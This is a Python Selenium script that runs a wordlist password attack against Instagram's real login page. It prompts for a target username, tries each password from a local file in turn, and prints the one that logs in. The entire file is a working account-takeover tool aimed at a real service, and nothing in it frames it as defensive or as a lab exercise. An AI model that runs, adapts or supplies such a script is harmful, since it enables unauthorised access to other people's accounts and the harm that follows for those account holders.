from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from colorama import Fore, Back, Style
import time,colorama

#initialize colorama for later use
colorama.init()

def make_list():
    with open ("list.txt",'r') as f:
        passlist = [line.strip() for line in f]
    return passlist

#get the elements
def find_elements(driver):
    #find the username element by name
    username = driver.find_element_by_name('username')
    #find the password element
    password = driver.find_element_by_name('password')
    #find the submit button
    login_button = driver.find_element_by_xpath('//*[@id="react-root"]/section/main/div/article/div/div[1]/div/form/div[3]/button')
    return username,password,login_button
#end of find_elements function

#send the specific login keys to their respective elements
def send_login(u,p,login_button,uName,pWord):
    #send given username into its text field
    u.send_keys(uName)
    #send popped password into its respective text field
    p.send_keys(pWord)
    #click the submit button
    login_button.click()
#end of send_login function

#check if the login worked or not
def is_logged_in(driver,username,password):
    try:
        username = driver.find_element_by_name('username')
        driver.get("https://www.instagram.com/accounts/login/")
        return False
    except:
        return True
#end log in check function

#set the webdriver to chrome because why not
driver = webdriver.Chrome('chromedriver.exe')
#get the instagram page
driver.get('https://www.instagram.com/accounts/login/')
#get the desired username
uName = input ("[?] Enter a username:")
#find the username,password and login button elements so that we can use them elsewhere
username,password,login_button = find_elements(driver)
#make a password list seperated by returns
passlist = make_list()
#get the length of said list
pass_list_length = len(passlist)
#print out that the x number of passwords were loaded
print (Fore.GREEN + "[*] {0} passwords loaded successfully".format(pass_list_length))
#for every item in the list starting at 0
for i in range(0, pass_list_length):
    username,password,login_button = find_elements(driver)
    #get number i popped from the list
    pWord = passlist[i]
    #attempt to login
    send_login(username,password,login_button,uName,pWord)
    #neccasary sleep for 1 second or else it doesnt have time to load
    time.sleep(1)
    #get true or false if it worked
    balance_beam = is_logged_in(driver,username,password)
    if balance_beam:
        print (Fore.GREEN + "[!] Logged in as {0} with password {1}".format(uName,pWord))
        time.sleep(20)
        break
    else:
        print (Fore.RED + "[*] Failed to login as {0} with password {1}".format(uName,pWord))
        print ("[-] Attempt {0}/{1}".format(i+1,pass_list_length))